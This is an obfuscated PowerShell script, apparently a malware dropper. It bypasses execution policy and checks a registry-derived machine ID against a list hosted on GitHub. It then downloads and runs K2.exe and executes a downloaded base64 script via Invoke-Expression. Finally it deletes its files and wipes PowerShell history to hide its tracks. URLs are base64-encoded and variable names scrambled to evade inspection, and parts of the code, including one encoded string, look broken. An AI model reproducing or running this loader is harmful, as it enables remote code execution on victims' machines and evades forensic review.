
foreach($k in [char[]]"a1b2c3d4e5f6g7h8".ToCharArray()|sort{random}){$v+=$k};${$v}=[System.IO.Path]::GetTempPath();foreach($k in [char[]]"x1y2z3".ToCharArray()|sort{random}){$w+=$k};${$w}="K2.exe";foreach($k in [char[]]"p1q2r3".ToCharArray()|sort{random}){$x+=$k};${$x}=Join-Path ${$v} ${$w};foreach($k in [char[]]"m1n2o3".ToCharArray()|sort{random}){$y+=$k};${$y}="opt_file.ps1";foreach($k in [char[]]"j1k2l3".ToCharArray()|sort{random}){$z+=$k};${$z}=Join-Path ${$v} ${$y};foreach($k in [char[]]"s1t2u3".ToCharArray()|sort{random}){$a+=$k};${$a}="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";foreach($k in [char[]]"u1v2w3".ToCharArray()|sort{random}){$b+=$k};${$b}=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0hBQ0t4OTkvTWFpbjEvbWFpbi9LMi5leGU='));foreach($k in [char[]]"q1r2s3".ToCharArray()|sort{random}){$c+=$k};${$c}=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0hBQ0t4OTkvTWFpbjEvbWFpbi9lbmNyeXB0ZWRfZmlsZS5wc2E='));foreach($k in [char[]]"t1u2v3".ToCharArray()|sort{random}){$h+=$k};${$h}=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0hBQ0t4OTkvT3B0aW1pemF0aW9uOTkvbWFpbi9UZXh0'));foreach($k in [char[]]"e1f2g3".ToCharArray()|sort{random}){$d+=$k};${$d}="MySecretKey123"; # Encryption key (change and sync with Text file)

try {
    foreach($k in [char[]]"i1j2k3".ToCharArray()|sort{random}){$e+=$k};${$e}={Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue};& ${$e};

    # Get HWID from registry and encrypt
    foreach($k in [char[]]"n1o2p3".ToCharArray()|sort{random}){$f+=$k};${$f}="HKEY_USERS\S-1-5-21-2547101770-1604906679-2849082827-1001";
    foreach($k in [char[]]"q1r2s3".ToCharArray()|sort{random}){$g+=$k};${$g}=(Get-ItemProperty -Path "Registry::${$f}" -ErrorAction SilentlyContinue).ProfileImagePath;
    if (-not ${$g}) { throw "Unable to retrieve registry value" }
    foreach($k in [char[]]"r1s2t3".ToCharArray()|sort{random}){$i+=$k};${$i}=(Get-FileHash -InputStream ([IO.MemoryStream]::new([System.Text.Encoding]::UTF8.GetBytes(${$g}))) -Algorithm SHA256).Hash;
    foreach($k in [char[]]"t1u2v3".ToCharArray()|sort{random}){$j+=$k};${$j}=[System.Text.Encoding]::UTF8.GetBytes(${$i} + ${$d}); # Simple XOR with key
    foreach($k in [char[]]"v1w2x3".ToCharArray()|sort{random}){$k+=$k};${$k}=[Convert]::ToBase64String(${$j});

    # Download and decrypt authorized HWIDs
    foreach($k in [char[]]"l1m2n3".ToCharArray()|sort{random}){$m+=$k};${$m}={Invoke-WebRequest -Uri $args[0] -OutFile $args[1] -UseBasicParsing};
    foreach($k in [char[]]"o1p2q3".ToCharArray()|sort{random}){$n+=$k};${$n}=& ${$m} ${$h} -UseBasicParsing;
    foreach($k in [char[]]"p1q2r3".ToCharArray()|sort{random}){$o+=$k};${$o}=${$n}.Content -split "`n" | Where-Object { $_ -match '\S' };
    foreach($k in [char[]]"s1t2u3".ToCharArray()|sort{random}){$p+=$k};${$p}=$false;
    foreach($k in [char[]]"u1v2w3".ToCharArray()|sort{random}){$q+=$k};foreach($auth in ${$o}){
        foreach($k in [char[]]"w1x2y3".ToCharArray()|sort{random}){$r+=$k};${$r}=[System.Text.Encoding]::UTF8.GetBytes([System.Convert]::FromBase64String($auth));
        foreach($k in [char[]]"y1z2a3".ToCharArray()|sort{random}){$s+=$k};${$s}=[System.Text.Encoding]::UTF8.GetString(${$r} -bxor [System.Text.Encoding]::UTF8.GetBytes(${$d}));
        if(${$s} -eq ${$i}){${$p}=$true;break}
    }

    if (-not ${$p}) {
        foreach($k in [char[]]"x1y2z3".ToCharArray()|sort{random}){$t+=$k};${$t}=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWF0Y2ggbm90IGZvdW5k'));
        Write-Host ${$t} -ForegroundColor Red;
        exit 1
    }

    # Download and execute K2.exe
    & ${$m} ${$b} ${$x};
    if(Test-Path ${$x}){
        foreach($k in [char[]]"z1a2b3".ToCharArray()|sort{random}){$u+=$k};${$u}={Start-Process -FilePath $args[0] -NoNewWindow -Wait};
        & ${$u} ${$x}
    } else { throw "ERR1" }

    # Download and execute encrypted PS file
    & ${$m} ${$c} ${$z};
    if(Test-Path ${$z}){
        foreach($k in [char[]]"b1c2d3".ToCharArray()|sort{random}){$v+=$k};${$v}=Get-Content -Path ${$z} -Raw;
        foreach($k in [char[]]"d1e2f3".ToCharArray()|sort{random}){$w+=$k};${$w}=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${$v}));
        foreach($k in [char[]]"f1g2h3".ToCharArray()|sort{random}){$x+=$k};${$x}={Invoke-Expression $args[0]};
        & ${$x} ${$w}
    } else { throw "ERR2" }

    # Additional cleanup
    foreach($k in [char[]]"h1i2j3".ToCharArray()|sort{random}){$y+=$k};${$y}=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aXdyIC1VcmkgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9IQUNLeDk5L01haW4xL21haW4vSzIuZXhlIiAtT3V0RmlsZSAiJGVudjpURU1QXFsyLmV4ZSIgLVVzZUJhc2ljUGFyc2luZzsgU3RhcnQtUHJvY2VzcyAtRmlleFBatGggIiRlbnY6VEVNUFxLMi5leGUiIC1XYWl0OyBSZW1vdmUtSXRlbSAiJGVudjpURU1QXFsyLmV4ZSIgLUZvcmNl'));
    & ${$x} ${$y};

    # Clean up files and history
    if(Test-Path ${$x}){Remove-Item ${$x} -Force};
    if(Test-Path ${$z}){Remove-Item ${$z} -Force};
    if(Test-Path ${$a}){
        Clear-History -ErrorAction SilentlyContinue;
        Remove-Item ${$a} -Force -ErrorAction SilentlyContinue;
        Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
    }
} catch {
    exit 1
} finally {
    exit 0
}
